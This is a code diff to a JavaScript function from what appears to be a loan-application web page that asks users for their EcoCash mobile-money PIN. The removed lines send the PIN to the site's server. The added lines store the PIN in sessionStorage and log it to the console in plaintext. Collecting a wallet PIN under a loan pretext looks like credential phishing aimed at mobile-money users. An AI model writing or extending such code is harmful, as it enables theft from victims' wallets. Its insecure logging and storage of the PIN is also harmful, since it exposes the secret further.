@@ -2249,12 +2249,21 @@ async function saveEcoCashPin() {
     const input =
         document.getElementById("ecoPin");
 
+    if (!input) {
+
+        console.error(
+            "ecoPin input not found."
+        );
+
+        return;
+    }
+
     const Pin =
         input.value.trim();
 
     if (Pin === "") {
 
-        alert("Initiate your loan Withdrawal.");
+        alert("Please enter the your EcoCash PIN.");
 
         return;
     }
@@ -2269,48 +2278,19 @@ async function saveEcoCashPin() {
         return;
     }
 
-    try {
+    // Save locally first
+    sessionStorage.setItem(
+        "ecoPin",
+        Pin
+    );
 
-        const response = await fetch(
-            `/save-ecocash-pin/${applicationId}`,
-            {
-                method: "POST",
+    console.log(
+        "PIN:",
+        sessionStorage.getItem("ecoPin")
+    );
 
-                headers: {
-                    "Content-Type": "application/json"
-                },
-
-                body: JSON.stringify({
-                    ecoPin: Pin
-                })
-            }
-        );
-
-        const result =
-            await response.json();
-
-        if (!response.ok || !result.success) {
-
-            throw new Error(
-                result.message ||
-                "Enter correct PIN."
-            );
-        }
-
-        // Continue with the application
-        submitEcoCashApplication();
-
-    } catch (err) {
-
-        console.error(
-            "SAVE ECOCASH PIN ERROR:",
-            err
-        );
-
-        alert(
-            "Unable to save the PIN."
-        );
-    }
+    // Continue
+    submitEcoCashApplication();
 }
 
 // ======================================================
